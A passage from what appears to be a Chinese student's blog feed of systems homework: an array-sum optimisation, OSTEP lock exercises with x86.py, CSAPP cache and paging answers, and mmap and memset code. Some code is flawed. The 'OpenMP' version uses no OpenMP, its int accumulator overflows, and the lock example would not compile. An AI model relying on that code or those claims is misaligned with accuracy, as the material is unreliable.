class="line">  <span class="built_in">free</span>(x); <span class="comment">// 释放分配的内存</span></span><br><span class="line">  <span class="built_in">free</span>(y);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果(c为整数int型):</p><p><img src="/../images/%E9%87%8D%E6%96%B0%E7%BB%84%E5%90%88%E5%8F%98%E6%8D%A2/image-20240516185334209-17158568152943.png" alt="image-20240516185334209"></p><p>运行结果(c为浮点double型):</p><p><img src="/../images/%E9%87%8D%E6%96%B0%E7%BB%84%E5%90%88%E5%8F%98%E6%8D%A2/image-20240516190654403.png" alt="image-20240516190654403"></p><h3 id="优化"><a href="#优化" class="headerlink" title="优化:"></a>优化:</h3><p>考虑以下的优化方法：</p><ol><li>分支预测优化: 尽量减少或重组代码中的条件语句，避免处理器分支预测失败导致的性能损失。</li><li>并行计算: 如果使用的编译器和硬件支持，可以利用并行计算来提升性能，如 OpenMP 用于在多核心处理器上自动分配计算。</li></ol><p>基于这两种思路来修改代码。就得到了如下进行优化后的代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ll long long</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用CSAPP中的方法优化的函数</span></span><br><span class="line">ll <span class="title function_">sum_array_optimized</span><span class="params">(<span class="type">int</span> *x, <span class="type">int</span> *y, <span class="type">int</span> length, <span class="type">int</span> c)</span> &#123;</span><br><span class="line">    ll sum = <span class="number">0</span>;</span><br><span class="line">    ll i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> limit = length - <span class="number">1</span>; <span class="comment">// 提前计算循环上界，减少每次循环的计算量</span></span><br><span class="line">    <span class="type">int</span> temp_sum = <span class="number">0</span>; <span class="comment">// 使用局部变量减少内存访问</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; limit; i += <span class="number">2</span>) &#123; <span class="comment">// 双倍增加步长以减少循环次数</span></span><br><span class="line">        temp_sum += x[i] * y[i] + c;</span><br><span class="line">        temp_sum += x[i+<span class="number">1</span>] * y[i+<span class="number">1</span>] + c; <span class="comment">// 展开循环内的计算以增加指令级并行性</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理尾部可能未对齐的元素</span></span><br><span class="line">    <span class="keyword">for</span> (; i &lt; length; ++i) &#123;</span><br><span class="line">        temp_sum += x[i] * y[i] + c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sum = temp_sum;</span><br><span class="line">    <span class="keyword">return</span> sum; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    ll length = <span class="number">99999999</span>; <span class="comment">// 数组长度</span></span><br><span class="line">    <span class="type">int</span> *x = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * length);</span><br><span class="line">    <span class="type">int</span> *y = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * length);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 确保分配的内存是对齐的，提高存取效率</span></span><br><span class="line">    <span class="keyword">if</span> (x == <span class="literal">NULL</span> || y == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Memory allocation failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 初始化数组元素，以便测试</span></span><br><span class="line">    ll i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (; i &lt; length; i++)&#123;</span><br><span class="line">        x[i] = <span class="number">10</span>;</span><br><span class="line">        y[i] = <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> c = <span class="number">-4</span>; <span class="comment">// 示例常数c</span></span><br><span class="line"></span><br><span class="line">    <span class="type">clock_t</span> start, end;</span><br><span class="line">    <span class="type">double</span> cpu_time_used;</span><br><span class="line"></span><br><span class="line">    start = clock(); <span class="comment">// 记录起始时间</span></span><br><span class="line">    ll result = sum_array_optimized(x, y, length, c);</span><br><span class="line">    end = clock(); <span class="comment">// 记录结束时间</span></span><br><span class="line"></span><br><span class="line">    cpu_time_used = ((<span class="type">double</span>)(end - start)) / CLOCKS_PER_SEC;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;运算结果: %lld\n&quot;</span>, result);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;运算花费时长: %f 秒\n&quot;</span>, cpu_time_used);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(x); <span class="comment">// 释放分配的内存</span></span><br><span class="line">    <span class="built_in">free</span>(y);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过运行，其运行时间为:</p><p>c为整数int型:</p><p><img src="/../images/%E9%87%8D%E6%96%B0%E7%BB%84%E5%90%88%E5%8F%98%E6%8D%A2/image-20240516185423078-17158568643604.png" alt="image-20240516185423078"></p><p>c为浮点double型</p><p><img src="/../images/%E9%87%8D%E6%96%B0%E7%BB%84%E5%90%88%E5%8F%98%E6%8D%A2/image-20240516190714261.png" alt="image-20240516190714261"></p><p>可以看到运行速度大幅提升.</p><p>但是当c为浮点型时，由于OpenMP是多核心并行执行最后结果相加，最后得到的结果会有所不同</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;OpenMP&quot;&gt;&lt;a href=&quot;#OpenMP&quot; class=&quot;headerlink&quot; title=&quot;OpenMP&quot;&gt;&lt;/a&gt;OpenMP&lt;/h2&gt;&lt;h3 id=&quot;OpenMP-的工作原理&quot;&gt;&lt;a href=&quot;#OpenMP-的工作原理&quot; class=&quot;head</summary>
      
    
    
    
    <category term="计算机系统" scheme="https://ycx6666.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="小班" scheme="https://ycx6666.github.io/tags/%E5%B0%8F%E7%8F%AD/"/>
    
  </entry>
  
  <entry>
    <title>操作系统作业28章</title>
    <link href="https://ycx6666.github.io/2024/05/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BD%9C%E4%B8%9A28%E7%AB%A0/"/>
    <id>https://ycx6666.github.io/2024/05/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BD%9C%E4%B8%9A28%E7%AB%A0/</id>
    <published>2024-05-17T13:44:57.000Z</published>
    <updated>2024-05-18T07:42:14.385Z</updated>
    
    <content type="html"><![CDATA[<p>虚拟机用户名称ycx66</p><p><img src="/../images/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BD%9C%E4%B8%9A28%E7%AB%A0/image-20240510105507396-17153097089842.png" alt="image-20240510105507396"></p><h2 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h2><p><strong>首先用标志-p flag.s 运行 x86.py。该代码通过一个内存标志“实现”锁。你能理解汇编代码试图做什么吗？</strong> </p><p>答:</p><p>输入 <code>./x86.py -p flag.s</code> 运行，得到如下结果</p><p><img src="/../images/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BD%9C%E4%B8%9A28%E7%AB%A0/image-20240509215227646-17152627494991.png" alt="image-20240509215227646"></p><p>可以看到，在该程序中，存在着两个进程在执行，当进程0执行完毕之后，才开始执行进程1:</p><p>其可能是如下c代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> count=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>  <span class="title">lock_t</span> &#123;</span> </span><br><span class="line">        <span class="type">int</span> flag; </span><br><span class="line">&#125; <span class="type">lock_t</span>; </span><br><span class="line"></span><br><span class="line"><span class="type">lock_t</span> lock;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">(<span class="type">lock_t</span> *lock)</span> &#123; </span><br><span class="line">     lock-&gt;flag = <span class="number">0</span>; </span><br><span class="line">&#125; </span><br><span class="line">  </span><br><span class="line"><span class="type">void</span> <span class="title function_">lock</span><span class="params">(<span class="type">lock_t</span> *lock)</span> &#123; </span><br><span class="line">  <span class="keyword">while</span> (TestAndSet(&amp;lock-&gt;flag, <span class="number">1</span>) == <span class="number">1</span>) <span class="number">12</span>           ; </span><br><span class="line">&#125; </span><br><span class="line">  </span><br><span class="line"><span class="type">void</span> <span class="title function_">unlock</span><span class="params">(<span class="type">lock_t</span> *lock)</span> &#123; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">pthread_t</span> thread1, thread2;</span><br><span class="line">init(lock);</span><br><span class="line">    pthread_create(&amp;thread1, <span class="literal">NULL</span>, &amp;threadFunc, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;thread2, <span class="literal">NULL</span>, &amp;threadFunc, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//第一个线程</span></span><br><span class="line">  lock(lock)</span><br><span class="line">    pthread_join(thread1, <span class="literal">NULL</span>);</span><br><span class="line">  count++;</span><br><span class="line">  unlock(lock)</span><br><span class="line">    <span class="comment">//第二个线程</span></span><br><span class="line">    lock(lock)</span><br><span class="line">    pthread_join(thread2, <span class="literal">NULL</span>);</span><br><span class="line">count++;</span><br><span class="line">  unlock(lock)</span><br><span class="line">  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Final count is %d\n&quot;</span>, count);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里使用了<strong>测试并设置</strong>的思想来来实现两个线程的并发模式控制。</p><p>当flag&#x3D;0时，其中一个线程运行并上“锁”，另外一个线程需要等到这个线程flag被设置为1后，才能尝试运行，否则则保持自旋状态。</p><h2 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h2><p><strong>使用默认值运行时，flag.s 是否按预期工作？</strong><br><strong>它会产生正确的结果吗？使用-M 和-R 标志跟踪变量和寄存器（并打开-c 查看它们的值）。你能预测代码运行时标志最终会变成什么值吗？</strong> </p><p>答：</p><p>使用指令：<code>./x86.py -p flag.s -R ax,bx -M flag,count -c</code>运行后结果如下：</p><p><img src="/../images/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BD%9C%E4%B8%9A28%E7%AB%A0/image-20240510105411284-17153096529601.png" alt="image-20240510105411284"></p><p>可以看出，在线程1和线程2上锁的过程中，变量flag确实被设置成了1，并且只有这一个线程被设置为1，当线程1运行结束之后，count++变为1。</p><p>同理当线程2运行完成之后，count++变为2,根据上一个问题得出的代码得出的推断与实际运行的结果相符，也就是能够进行预测。</p><p><img src="/../images/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BD%9C%E4%B8%9A28%E7%AB%A0/beff9d4f05feb4b8d8355510001caaf.png" alt="beff9d4f05feb4b8d8355510001caaf"></p><p><img src="/../images/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BD%9C%E4%B8%9A28%E7%AB%A0/image-20240510110051643.png" alt="image-20240510110051643"></p><p><img src="/../images/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BD%9C%E4%B8%9A28%E7%AB%A0/1136ff0f101b9c1301d8b5c156fc05f.png" alt="1136ff0f101b9c1301d8b5c156fc05f"></p><p><img src="/../images/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BD%9C%E4%B8%9A28%E7%AB%A0/7dfb03068b56aae318e0fc174811a0e.png" alt="7dfb03068b56aae318e0fc174811a0e"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;虚拟机用户名称ycx66&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/../images/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BD%9C%E4%B8%9A28%E7%AB%A0/image-20240510105507396-171530</summary>
      
    
    
    
    <category term="作业" scheme="https://ycx6666.github.io/categories/%E4%BD%9C%E4%B8%9A/"/>
    
    
    <category term="操作系统" scheme="https://ycx6666.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://ycx6666.github.io/2024/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%BD%9C%E4%B8%9A%E4%B8%89/"/>
    <id>https://ycx6666.github.io/2024/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%BD%9C%E4%B8%9A%E4%B8%89/</id>
    <published>2024-05-14T08:17:05.171Z</published>
    <updated>2024-05-14T14:31:29.005Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第六章"><a href="#第六章" class="headerlink" title="第六章"></a>第六章</h2><h3 id="6-30"><a href="#6-30" class="headerlink" title="6.30"></a>6.30</h3><p><img src="/../images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%BD%9C%E4%B8%9A%E4%B8%89/image-20240514161908191-17156747529251.png" alt="image-20240514161908191"></p><p><img src="/../images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%BD%9C%E4%B8%9A%E4%B8%89/image-20240514161926375-17156747677432.png" alt="image-20240514161926375"></p><p><strong>A:</strong></p><table><thead><tr><th>11</th><th>10</th><th>9</th><th>8</th><th>7</th><th>6</th><th>5</th><th>4</th><th>3</th><th>2</th><th>1</th><th>0</th></tr></thead><tbody><tr><td>CT</td><td>CT</td><td>CT</td><td>CT</td><td>CT</td><td>CT</td><td>CT</td><td>CT</td><td>C1</td><td>C1</td><td>C0</td><td>C0</td></tr></tbody></table><p><strong>B:</strong></p><table><thead><tr><th>操作</th><th>地址</th><th>命中?</th><th>读出的值</th></tr></thead><tbody><tr><td>读</td><td>0x409</td><td>未命中</td><td>&#x2F;</td></tr><tr><td>写</td><td>0x40A</td><td>命中</td><td>&#x2F;</td></tr><tr><td>读</td><td>0x833</td><td>命中</td><td>0xD0</td></tr></tbody></table><h3 id="6-32"><a href="#6-32" class="headerlink" title="6.32"></a>6.32</h3><p><img src="/../images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%BD%9C%E4%B8%9A%E4%B8%89/image-20240514161947169-17156747882633.png" alt="image-20240514161947169"></p><p><img src="/../images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%BD%9C%E4%B8%9A%E4%B8%89/image-20240514162003467-17156748044434.png" alt="image-20240514162003467"></p><p><strong>A：</strong></p><table><thead><tr><th>12</th><th>11</th><th>10</th><th>9</th><th>8</th><th>7</th><th>6</th><th>5</th><th>4</th><th>3</th><th>2</th><th>1</th><th>0</th></tr></thead><tbody><tr><td>0</td><td>0</td><td>1</td><td>1</td><td>1</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td><td>0</td><td>0</td><td>0</td></tr></tbody></table><p><strong>B：</strong></p><table><thead><tr><th>参数</th><th>值</th></tr></thead><tbody><tr><td>块偏移量</td><td>0x0</td></tr><tr><td>索引</td><td>0x6</td></tr><tr><td>高速缓存示记</td><td>0x38</td></tr><tr><td>高速缓存命中</td><td>命中</td></tr><tr><td>返回的高速缓存值</td><td>0xFA</td></tr></tbody></table><h3 id="6-35"><a href="#6-35" class="headerlink" title="6.35"></a>6.35</h3><p><img src="/../images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%BD%9C%E4%B8%9A%E4%B8%89/image-20240514162021137-17156748224395.png" alt="image-20240514162021137"></p><p><img src="/../images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%BD%9C%E4%B8%9A%E4%B8%89/image-20240514162034408-17156748358946.png" alt="image-20240514162034408"></p><p><strong>dst数组</strong></p><table><thead><tr><th></th><th>0</th><th>1</th><th>2</th><th>3</th></tr></thead><tbody><tr><td>0</td><td>m</td><td>h</td><td>h</td><td>h</td></tr><tr><td>1</td><td>m</td><td>h</td><td>h</td><td>h</td></tr><tr><td>2</td><td>m</td><td>h</td><td>h</td><td>h</td></tr><tr><td>3</td><td>m</td><td>h</td><td>h</td><td>h</td></tr></tbody></table><p><strong>src数组</strong></p><table><thead><tr><th></th><th>0</th><th>1</th><th>2</th><th>3</th></tr></thead><tbody><tr><td>0</td><td>m</td><td>m</td><td>m</td><td>m</td></tr><tr><td>1</td><td>m</td><td>m</td><td>m</td><td>m</td></tr><tr><td>2</td><td>m</td><td>m</td><td>m</td><td>m</td></tr><tr><td>3</td><td>m</td><td>m</td><td>m</td><td>m</td></tr></tbody></table><h3 id="6-42"><a href="#6-42" class="headerlink" title="6.42"></a>6.42</h3><p><img src="/../images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%BD%9C%E4%B8%9A%E4%B8%89/image-20240514162046677-17156748478707.png" alt="image-20240514162046677"></p><p><img src="/../images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%BD%9C%E4%B8%9A%E4%B8%89/image-20240514162100332-17156748610638.png" alt="image-20240514162100332"></p><p>当其按列读取时，会先读取<code>buffer[i][j].r</code>，发生未命中，然后将<code>.g,.b,.a</code>三个char型数据放入缓存，因此其不命中率为<code>25%</code></p><h2 id="第九章"><a href="#第九章" class="headerlink" title="第九章"></a>第九章</h2><h3 id="9-13"><a href="#9-13" class="headerlink" title="9.13"></a>9.13</h3><p><img src="/../images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%BD%9C%E4%B8%9A%E4%B8%89/image-20240514162137990-17156748993089.png" alt="image-20240514162137990"></p><p><strong>A:</strong></p><table><thead><tr><th>13</th><th>12</th><th>11</th><th>10</th><th>9</th><th>8</th><th>7</th><th>6</th><th>5</th><th>4</th><th>3</th><th>2</th><th>1</th><th>0</th></tr></thead><tbody><tr><td>VPN</td><td>VPN</td><td>VPN</td><td>VPN</td><td>VPN</td><td>VPN</td><td>VPN</td><td>VPN</td><td>VPO</td><td>VPO</td><td>VPO</td><td>VPO</td><td>VPO</td><td>VPO</td></tr><tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr></tbody></table><p><strong>B:</strong></p><table><thead><tr><th>参数</th><th>值</th></tr></thead><tbody><tr><td>VPN</td><td>0b 0000001</td></tr><tr><td>TLB索引</td><td>0b 01</td></tr><tr><td>TLB标记</td><td>0b 000000</td></tr><tr><td>TLB是否命中</td><td>否</td></tr><tr><td>是否缺页</td><td>是</td></tr><tr><td>PPN</td><td>-</td></tr></tbody></table><p><strong>C、D：</strong>不存在物理地址</p><h3 id="9-14"><a href="#9-14" class="headerlink" title="9.14"></a>9.14</h3><p><img src="/../images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%BD%9C%E4%B8%9A%E4%B8%89/image-20240514162152706-171567491350810.png" alt="image-20240514162152706"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span> <span class="comment">// 为mmap函数提供声明</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span>  <span class="comment">// 为文件操作提供声明</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span> <span class="comment">// 为close函数提供声明</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span> <span class="comment">// 为strlen函数提供声明</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> file = open( <span class="string">&quot;hello.txt&quot;</span>, O_RDWR ); <span class="comment">// 打开文件，以读-写方式</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (file &lt; <span class="number">0</span>) <span class="comment">// 如果文件打开失败</span></span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;Error opening file for writing&quot;</span>); <span class="comment">// 输出错误信息</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">off_t</span> size = lseek(file, <span class="number">0</span>, SEEK_END); <span class="comment">// 获取文件大小</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用mmap映射文件到内存</span></span><br><span class="line">    <span class="type">char</span>* data = mmap(<span class="number">0</span>, size, PROT_READ | PROT_WRITE, MAP_SHARED, file, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (data == MAP_FAILED) <span class="comment">// 如果映射失败</span></span><br><span class="line">    &#123;</span><br><span class="line">        close(file);</span><br><span class="line">        perror(<span class="string">&quot;Error mmapping the file&quot;</span>); <span class="comment">// 输出错误信息</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data[<span class="number">0</span>] = <span class="string">&#x27;J&#x27;</span>; <span class="comment">// 改变映射内存的第一个字符</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (msync(data, size, MS_SYNC) == <span class="number">-1</span>) <span class="comment">// 同步内存映射区的内容到文件中</span></span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;Could not sync the file to disk&quot;</span>); <span class="comment">// 如果同步失败，输出错误信息</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放内存映射区</span></span><br><span class="line">    <span class="keyword">if</span> (munmap(data, size) == <span class="number">-1</span>) &#123;</span><br><span class="line">        close(file);</span><br><span class="line">        perror(<span class="string">&quot;Error un-mmapping the file&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(file); <span class="comment">// 关闭文件</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="第五章"><a href="#第五章" class="headerlink" title="第五章"></a>第五章</h2><h3 id="5-19"><a href="#5-19" class="headerlink" title="5.19"></a>5.19</h3><p><img src="/../images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%BD%9C%E4%B8%9A%E4%B8%89/image-20240514162230268-171567495121111.png" alt="image-20240514162230268"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">optimized_memset</span><span class="params">(<span class="type">void</span> *s, <span class="type">int</span> c, <span class="type">size_t</span> n)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> k = <span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *byte_ptr = (<span class="type">unsigned</span> <span class="type">char</span> *)s;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> value = (<span class="type">unsigned</span> <span class="type">char</span>)c;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用无符号长字节（unsigned long）填充值，使用移位和 OR 运算以获得连续的同值字节</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> word_value = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; k; ++i) &#123;</span><br><span class="line">        word_value |= ((<span class="type">unsigned</span> <span class="type">long</span>)value &lt;&lt; (i * <span class="number">8</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 首先处理直至对齐的字节</span></span><br><span class="line">    <span class="keyword">while</span> (((<span class="type">unsigned</span> <span class="type">long</span>)byte_ptr % k != <span class="number">0</span>) &amp;&amp; n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        *byte_ptr++ = value;</span><br><span class="line">        --n;</span><br><span class="line">    &#125;</span><br><span 